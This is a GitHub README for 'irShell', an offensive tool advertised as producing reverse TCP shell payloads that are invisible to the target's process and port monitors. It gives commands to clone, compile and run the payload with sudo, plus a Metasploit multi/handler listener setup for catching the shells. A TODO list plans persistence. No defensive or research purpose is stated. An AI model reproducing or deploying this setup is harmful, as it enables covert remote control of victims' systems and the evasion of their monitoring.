# irShell
💯% Invisible Reverse TCP Shell Payloads for Linux/Windows 🥷
 

<p align="center">
  <img width="560" height="330" src="https://github.com/MBHudson/irShell/blob/main/ports.jpg">
</p>

## About:
What I believe to be an original and effective method for creating reverse TCP payloads that are 100% invisible not only to the target but the target's resource/process monitors, no PIDs or even open ports are visible. Simple MSFconsole handlers/listeners are then used for callbacks.
### Pictured above is some Nmap and Grep output referencing this payloads used ports still showimg closed or not in use on the machine where the payload has been deployed. Pictured below are two screen captures of the same system's Htop output showing no process/PID
<p align="center">
  <img width="320" height="530" src="https://github.com/MBHudson/irShell/blob/main/Screenshot_20221106-222819_JuiceSSH.jpg/">
  <img width="320" height="530" src="https://github.com/MBHudson/irShell/blob/main/Screenshot_20221106-222822_JuiceSSH.jpg/">
</p>



## Requirments:

SHC 

```
sudo apt install -y shc
```

Bash

```
sudo apt install -y bash
```
GCC

```
sudo apt install -y gcc
```




## Installation:

```
git clone https://github.com/MBHudson/irShell.git && cd irShell && sudo gcc irShell.c -o irShell && sudo chmod +x irShell
```

## Usage:

```
sudo ./irShell
```




## MSFconsole:

<p align="center">
  <img width="560" height="330" src="https://github.com/MBHudson/irShell/blob/main/Screenshot_20221106_223907.jpg">
</p>




```
set exploit/multi/handler
set PAYLOAD linux/x64/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run
```

## TODO

- [ ] Persistence without reboot
- [ ] EXE and Shell formats
- [ ] All-in-One built-in dependency installation 
